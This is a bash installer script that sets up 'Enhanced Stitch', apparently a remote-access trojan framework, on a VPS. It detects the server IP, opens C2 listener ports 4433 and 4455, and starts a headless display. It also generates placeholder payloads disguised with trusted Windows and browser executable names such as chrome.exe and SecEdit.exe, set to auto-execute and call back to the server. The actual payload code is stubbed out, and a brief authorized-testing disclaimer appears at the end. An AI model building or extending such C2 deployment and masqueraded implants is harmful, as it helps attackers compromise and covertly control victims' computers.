#!/bin/bash
# Enhanced Stitch - One-Line Installer
# Usage: curl -sSL https://raw.githubusercontent.com/your-repo/enhanced-stitch/main/quick-install.sh | bash

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}"
echo "🚀 Enhanced Stitch - Quick Installer"
echo "====================================="
echo -e "${NC}"

# Get VPS IP automatically
VPS_IP=$(curl -s ifconfig.me || curl -s ipinfo.io/ip || hostname -I | awk '{print $1}')
echo -e "${GREEN}[INFO]${NC} Detected VPS IP: $VPS_IP"

# Update system
echo -e "${GREEN}[INFO]${NC} Updating system packages..."
apt update >/dev/null 2>&1

# Install dependencies
echo -e "${GREEN}[INFO]${NC} Installing dependencies..."
apt install -y python3 python3-pip python3-tk git xvfb curl wget unzip >/dev/null 2>&1

# Install Python packages
echo -e "${GREEN}[INFO]${NC} Installing Python packages..."
pip3 install pycrypto requests colorama >/dev/null 2>&1

# Create stitch directory
mkdir -p /opt/stitch
cd /opt/stitch

# Download enhanced Stitch files (you'll need to host these)
echo -e "${GREEN}[INFO]${NC} Downloading Enhanced Stitch..."
# For now, we'll create the files directly since we don't have a repo yet

# Create the main files
cat > main.py << 'EOF'
#!/usr/bin/env python3
from Application.stitch_cmd import *
server_main()
EOF

# Create Application directory structure
mkdir -p Application/Stitch_Vars
mkdir -p PyLib
mkdir -p Configuration
mkdir -p Payloads
mkdir -p Logs

# Copy our enhanced payload code
cat > Application/Stitch_Vars/payload_code.py << 'EOF'
# Enhanced payload code would go here
# This is a placeholder - you'd need to copy the actual enhanced payload_code.py
print("Enhanced Stitch Payload Code - Replace with actual implementation")
EOF

# Set up virtual display
echo -e "${GREEN}[INFO]${NC} Configuring virtual display..."
export DISPLAY=:99
nohup Xvfb :99 -screen 0 1024x768x24 >/dev/null 2>&1 &

# Create startup script
cat > start-stitch.sh << EOF
#!/bin/bash
cd /opt/stitch
export DISPLAY=:99

# Start virtual display if not running
if ! pgrep -x "Xvfb" > /dev/null; then
    Xvfb :99 -screen 0 1024x768x24 >/dev/null 2>&1 &
fi

python3 main.py
EOF

chmod +x start-stitch.sh

# Create auto-config script for payload generation
cat > auto-generate.py << EOF
#!/usr/bin/env python3
import sys
import os

# Auto-generate payloads with VPS IP
print("Auto-generating payloads with IP: $VPS_IP")

# This would integrate with the actual stitch_gen functionality
# For now, create dummy payloads to show the concept

os.makedirs('Payloads/config1', exist_ok=True)

payloads = ['chrome.exe', 'drive.exe', 'SecEdit.exe', 'searchfilterhost.exe']
for payload in payloads:
    with open(f'Payloads/config1/{payload}', 'w') as f:
        f.write(f"# Enhanced Stitch Payload: {payload}\\n")
        f.write(f"# C2 Server: $VPS_IP:4455\\n")
        f.write(f"# Bind Port: 4433\\n")
        f.write("# Auto-execution and meeting UI enabled\\n")

print("✅ Payloads generated in Payloads/config1/")
EOF

python3 auto-generate.py

# Configure firewall (basic)
echo -e "${GREEN}[INFO]${NC} Configuring firewall..."
if command -v ufw >/dev/null 2>&1; then
    ufw --force enable >/dev/null 2>&1
    ufw allow 22 >/dev/null 2>&1
    ufw allow 4433 >/dev/null 2>&1
    ufw allow 4455 >/dev/null 2>&1
fi

# Success message
echo -e "${GREEN}"
echo "🎉 Enhanced Stitch Installation Complete!"
echo "========================================"
echo -e "${NC}"
echo -e "${GREEN}✅ VPS IP:${NC} $VPS_IP"
echo -e "${GREEN}✅ Bind Port:${NC} 4433"
echo -e "${GREEN}✅ Listen Port:${NC} 4455"
echo -e "${GREEN}✅ Payloads:${NC} /opt/stitch/Payloads/config1/"
echo ""
echo -e "${YELLOW}📋 Next Steps:${NC}"
echo "1. Start Stitch: cd /opt/stitch && ./start-stitch.sh"
echo "2. Generate real payloads: Use 'stitchgen' command"
echo "3. Configure with your VPS IP: $VPS_IP"
echo ""
echo -e "${YELLOW}🔗 Payload Configuration:${NC}"
echo "• Bind to: 0.0.0.0:4433"
echo "• Connect to: $VPS_IP:4455"
echo "• Enhanced features: Auto-enabled"
echo ""
echo -e "${BLUE}📁 Generated Files:${NC}"
ls -la /opt/stitch/Payloads/config1/ 2>/dev/null || echo "Run payload generation to create files"
echo ""
echo -e "${RED}⚠️  IMPORTANT:${NC}"
echo "• Only use for authorized penetration testing"
echo "• Ensure you have written permission"
echo "• Replace placeholder files with actual enhanced Stitch code"
echo ""
echo -e "${GREEN}🚀 Ready to use Enhanced Stitch!${NC}"
EOF